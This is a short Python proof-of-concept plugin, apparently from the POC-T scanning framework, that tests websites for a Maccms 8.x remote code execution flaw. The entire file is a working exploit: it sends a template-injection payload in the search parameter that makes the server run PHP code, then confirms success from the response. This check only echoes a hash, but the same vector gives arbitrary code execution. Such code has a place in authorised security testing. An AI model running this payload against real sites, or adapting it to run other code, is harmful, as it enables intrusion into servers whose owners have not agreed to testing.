#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = potapo

"""
Maccms 8.x Remote Code Execution
"""

import requests
from plugin.util import randomMD5


def poc(url):
    if '://' not in url:
        url = 'http://' + url
    try:
        p, c = randomMD5()
        payload = "/index.php?m=vod-search&wd={if-A:die(md5(%s))}{endif-A}" % (p)
        if c in requests.get(url + payload, allow_redirects=False).text:
            return '[maccms]' + url
    except Exception:
        pass
    return False
